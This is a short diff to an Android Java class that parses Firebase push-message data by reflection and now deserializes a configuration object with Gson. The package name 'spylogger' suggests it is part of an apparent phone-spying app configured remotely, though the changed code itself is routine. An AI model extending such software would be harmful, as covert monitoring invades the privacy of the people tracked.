@@ -2,7 +2,7 @@ package com.gravatasufoca.spylogger.vos;
 
 import android.util.Log;
 
-import com.gravatasufoca.spylogger.model.Configuracao;
+import com.google.gson.Gson;
 import com.gravatasufoca.spylogger.model.TipoAcao;
 
 import java.lang.reflect.Field;
@@ -44,8 +44,10 @@ public class FcmMessageVO {
                         field.set(fcmMessageVO, Boolean.parseBoolean(data.get(field.getName())));
                     } else if (field.getType().isAssignableFrom(TipoAcao.class)) {
                         field.set(fcmMessageVO, TipoAcao.values()[Integer.parseInt(data.get(field.getName()))]);
-                    } else if (field.getType().isAssignableFrom(Configuracao.class)) {
-                        fcmMessageVO.getTipoAcao();
+                    } else if (field.getType().isAssignableFrom(ConfiguracaoVO.class)) {
+                        Gson gson=new Gson();
+                        ConfiguracaoVO configuracaoVO= gson.fromJson(data.get(field.getName()),ConfiguracaoVO.class);
+                        field.set(fcmMessageVO,configuracaoVO);
                     }
 
 
